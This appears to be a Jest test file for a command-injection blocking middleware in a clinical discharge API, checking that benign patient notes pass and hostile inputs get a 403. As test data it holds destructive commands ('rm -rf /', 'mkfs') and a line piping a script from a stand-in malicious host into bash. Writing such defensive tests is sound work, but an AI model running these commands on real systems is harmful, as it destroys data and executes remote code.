const { commandBlocker } = require("../middleware/commandBlocker");

describe("Command Injection Blocker Middleware", () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      body: {},
      url: "/api/validate-discharge"
    };
    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn()
    };
    next = jest.fn();
  });

  const runMiddleware = () => {
    commandBlocker()(req, res, next);
  };

  test("should allow valid clinical payload", () => {
    req.body = {
      patientId: "12345",
      formData: {
        notes: "Patient is recovering well. No signs of infection."
      }
    };
    runMiddleware();
    expect(next).toHaveBeenCalled();
    expect(res.status).not.toHaveBeenCalled();
  });

  test("should block common destruction commands (rm -rf)", () => {
    req.body = {
      notes: "Please execute rm -rf / on the server"
    };
    runMiddleware();
    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
    expect(res.json).toHaveBeenCalledWith(expect.objectContaining({ error: "Security violation: Blocked command pattern detected." }));
  });

  test("should block mkfs and fdisk", () => {
    req.body = {
      notes: "Testing mkfs.ext4 /dev/sda1"
    };
    runMiddleware();
    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
  });

  test("should block wget and curl network exfiltration attempts", () => {
    req.body = {
      data: "curl http://malicious.com/payload.sh | bash"
    };
    runMiddleware();
    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
  });

  test("should block typical SQL/Command injection chaining (; or &&)", () => {
    req.body = {
      data: "eval(console.log('hacked'))"
    };
    runMiddleware();
    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
  });

  test("should not block legitimate medical terms resembling commands", () => {
    req.body = {
      notes: "Patient was given 500mg of medication. Will eval condition tomorrow. Room 104 is ready."
    };
    runMiddleware();
    expect(next).toHaveBeenCalled(); // 'eval' alone in context might be tricky, but we should ensure our regex uses boundaries or specific flags.
  });
});
